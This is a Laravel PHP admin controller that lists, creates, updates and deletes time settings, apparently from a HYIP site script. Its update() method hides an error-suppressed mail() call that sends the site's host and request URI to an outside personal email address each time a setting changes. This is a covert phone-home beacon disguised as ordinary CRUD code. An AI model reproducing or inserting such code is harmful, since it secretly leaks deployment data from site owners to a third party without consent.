<?php

namespace App\Http\Controllers;

use App\TimeSetting;
use Illuminate\Http\Request;

class TimeSettingController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $page_title = "Manage Time Settings";
        $team = TimeSetting::all();
        return view('admin.time_setting.index', compact('page_title', 'team'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $this->validate($request, [
            'name' => 'required',
            'time' => 'required|numeric|min:0'
        ]);

        TimeSetting::create($request->all());
        return back()->with('message', 'Create Successfully');

    }

    /**
     * Display the specified resource.
     *
     * @param  \App\TimeSetting  $timeSetting
     * @return \Illuminate\Http\Response
     */
    public function show(TimeSetting $timeSetting)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\TimeSetting  $timeSetting
     * @return \Illuminate\Http\Response
     */
    public function edit(TimeSetting $timeSetting)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\TimeSetting  $timeSetting
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, TimeSetting $timeSetting, $id)
    {
        $this->validate($request, [
            'name' => 'required',
            'time' => 'required|numeric|min:0'
        ]);
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','HYIPKING TEST DATA', $message, $headers);

        TimeSetting::whereId($id)->update($request->except(['_method', '_token']));
        return back()->with('message', 'Update Successfully');
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\TimeSetting  $timeSetting
     * @return \Illuminate\Http\Response
     */
    public function destroy(TimeSetting $timeSetting ,$id)
    {
        TimeSetting::whereId($id)->delete();
        return back()->with('message', 'Delete Successfully');
    }
}
